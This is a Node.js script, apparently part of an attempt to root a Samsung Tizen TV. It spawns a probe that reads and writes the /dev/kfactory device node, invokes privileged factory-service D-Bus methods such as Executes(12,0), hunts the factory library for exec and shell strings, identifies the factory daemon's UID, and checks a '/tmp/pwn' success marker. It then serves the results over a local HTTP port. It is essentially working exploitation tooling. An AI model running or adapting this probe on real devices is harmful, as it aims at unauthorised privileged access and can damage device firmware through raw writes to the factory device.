'use strict';
var http = require('http');
var fs = require('fs');
var cp = require('child_process');

var PORT = 8177;
var PROBE_FILE = '/home/owner/share/tmp/sdk_tools/tbprobe88h.txt';
var PWN = '/tmp/pwn88h.txt';

var L = [
  'var fs = require("fs");',
  'var cp = require("child_process");',
  'var r = {};',

  // 1. Read /dev/kfactory using ES5-compatible Buffer (Node v4.4.3)
  'try {',
  '  var kfd = fs.openSync("/dev/kfactory", "r+");',
  '  var kbuf = new Buffer(256);',
  '  kbuf.fill(0);',
  '  var kn = fs.readSync(kfd, kbuf, 0, 256, 0);',
  '  fs.closeSync(kfd);',
  '  r.dev_kfactory_hex = kbuf.slice(0,kn).toString("hex");',
  '  r.dev_kfactory_ascii = kbuf.slice(0,kn).toString("utf8");',
  '} catch(e) { r.dev_kfactory_err = e.message; }',

  // 2. Check Smack label on /dev/kfactory
  'try {',
  '  var o_smk = cp.spawnSync("/bin/sh",["-c","getfattr --only-values -n security.SMACK64 /dev/kfactory 2>&1; echo --; ls -Z /dev/kfactory 2>&1"],{timeout:3000});',
  '  r.kfactory_smack = (o_smk.stdout||new Buffer(0)).toString().trim().slice(0,200);',
  '} catch(e) { r.kfactory_smack_err = e.message; }',

  // 3. Write to /dev/kfactory using ES5-compatible Buffer
  'try {',
  '  var wfd = fs.openSync("/dev/kfactory", "w");',
  '  var wbuf = new Buffer([0x01, 0x00, 0x00, 0x00]);',
  '  var wn = fs.writeSync(wfd, wbuf, 0, 4);',
  '  fs.closeSync(wfd);',
  '  r.dev_kfactory_write = { bytes: wn };',
  '} catch(e) { r.dev_kfactory_write_err = e.message; }',

  // 4. Run Executes(12,0) then capture dmesg using direct spawnSync (no shell quoting)
  'try {',
  '  var o_ex = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.Executes","12","0"],{timeout:5000});',
  '  r.exec12_out = (o_ex.stdout||new Buffer(0)).toString().trim().slice(0,100);',
  '  var o_dm = cp.spawnSync("dmesg",[],{timeout:5000});',
  '  var dmesg_lines = (o_dm.stdout||new Buffer(0)).toString().split("\\n");',
  '  r.dmesg_after_exec = dmesg_lines.filter(function(l){ return l.indexOf("factory")>-1||l.indexOf("kfac")>-1||l.indexOf("TIFac")>-1||l.indexOf("execl")>-1||l.indexOf("string")>-1; }).slice(-20).join("\\n").slice(0,2000);',
  '} catch(e) { r.exec12_err = e.message; }',

  // 5. Read libfactory-interface-ATSC.so strings
  'try {',
  '  var atsc_b = fs.readFileSync("/usr/lib/libfactory-interface-ATSC.so");',
  '  r.atsc_size = atsc_b.length;',
  '  var astrs = [], arun = 0, astart = 0;',
  '  for (var i = 0; i < atsc_b.length; i++) {',
  '    var b = atsc_b[i];',
  '    if (b >= 32 && b < 127) { if (arun === 0) astart = i; arun++; }',
  '    else { if (arun >= 6) astrs.push(atsc_b.slice(astart,astart+arun).toString("ascii")); arun = 0; }',
  '  }',
  '  r.atsc_exec = astrs.filter(function(s){ return s.indexOf("exec")>-1||s.indexOf("shell")>-1||s.indexOf("system")>-1||s.indexOf("popen")>-1||s.indexOf("/bin")>-1; }).slice(0,30);',
  '  r.atsc_paths = astrs.filter(function(s){ return s.charAt(0)==="/"; }).slice(0,30);',
  '  r.atsc_strings = astrs.filter(function(s){ return s.length > 10 && s.length < 100 && s.indexOf("_ZN") === -1 && s.indexOf("_ZT") === -1; }).slice(0,50);',
  '} catch(e) { r.atsc_err = e.message; }',

  // 6. Check /run/factory/ paths
  'try {',
  '  r.run_factory = fs.readdirSync("/run/factory").slice(0,20);',
  '} catch(e) { r.run_factory_err = e.message; }',

  // 7. Read /dev/console (kfactoryd logs there)
  'try {',
  '  var cfd = fs.openSync("/dev/console", "r");',
  '  var cbuf = new Buffer(512);',
  '  var cn = fs.readSync(cfd, cbuf, 0, 512, 0);',
  '  fs.closeSync(cfd);',
  '  r.console_read = cbuf.slice(0,cn).toString("utf8").replace(/[^\\x20-\\x7e\\x0a\\x0d]/g,".");',
  '} catch(e) { r.console_read_err = e.message; }',

  // 8. Check /opt/usr/apps/factory-service/ path
  'try {',
  '  r.fac_app_dir = fs.readdirSync("/opt/usr/apps/factory-service").slice(0,20);',
  '} catch(e) { r.fac_app_dir_err = e.message; }',
  'try {',
  '  r.fac_share_dir = fs.readdirSync("/opt/usr/apps/factory-service/share").slice(0,20);',
  '} catch(e) { r.fac_share_dir_err = e.message; }',

  // 9. Check TIFSDaemon binary path
  'try {',
  '  var pids = fs.readdirSync("/proc").filter(function(p){ return /^[0-9]+$/.test(p); });',
  '  r.tifs_daemon = null;',
  '  for (var pi = 0; pi < pids.length; pi++) {',
  '    try {',
  '      var comm = fs.readFileSync("/proc/"+pids[pi]+"/comm","utf8").trim();',
  '      if (comm.indexOf("TIFS") > -1 || comm.indexOf("tifs") > -1 || comm === "TIFSDaemon") {',
  '        var st = fs.readFileSync("/proc/"+pids[pi]+"/status","utf8");',
  '        var uid = st.match(/^Uid:\\t(\\d+)/m);',
  '        var cmd = fs.readFileSync("/proc/"+pids[pi]+"/cmdline","utf8").replace(/\\0/g," ").slice(0,100);',
  '        r.tifs_daemon = { pid: pids[pi], comm: comm, uid: uid?uid[1]:"?", cmd: cmd };',
  '        break;',
  '      }',
  '    } catch(e) {}',
  '  }',
  '} catch(e) {}',

  // 10. GetItem at wider range to find non-empty items
  'r.items_range = {};',
  'var check_keys = [30,50,100,200,300,500,1000,10000];',
  'check_keys.forEach(function(k) {',
  '  try {',
  '    var o = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.GetItem",String(k)],{timeout:4000});',
  '    var out = (o.stdout||new Buffer(0)).toString().trim();',
  '    if (out && out.indexOf("(1,)") === -1) r.items_range["k"+k] = out.slice(0,150);',
  '  } catch(e) {}',
  '});',

  // 11. Final pwn check
  'try { r.pwn_final = fs.readFileSync("' + PWN + '","utf8").trim(); } catch(e) { r.pwn_final_err = e.code; }',

  'var out = JSON.stringify(r,null,2);',
  'try { fs.writeFileSync("' + PROBE_FILE + '",out); } catch(e2) {}',
  'process.stdout.write(out);'
];

var INNER = L.join('\n');

function runProbe(cb) {
  cp.execFile(process.execPath, ['-e', INNER], { timeout: 150000 }, function(err, stdout, stderr) {
    if (err) {
      cb(JSON.stringify({ exec_error: err.message.slice(0,200), stderr: (stderr||'').slice(0,500) }));
    } else {
      cb(stdout || '{}');
    }
  });
}

var server = http.createServer(function(req, res) {
  runProbe(function(out) {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(out);
  });
});

server.on('error', function(e) {
  try { fs.writeFileSync(PROBE_FILE, JSON.stringify({ server_err: e.message })); } catch(e2) {}
});

server.listen(PORT, '127.0.0.1', function() {
  runProbe(function(out) {
    try { fs.writeFileSync(PROBE_FILE, out); } catch(e) {}
  });
});

setInterval(function() {}, 60000);
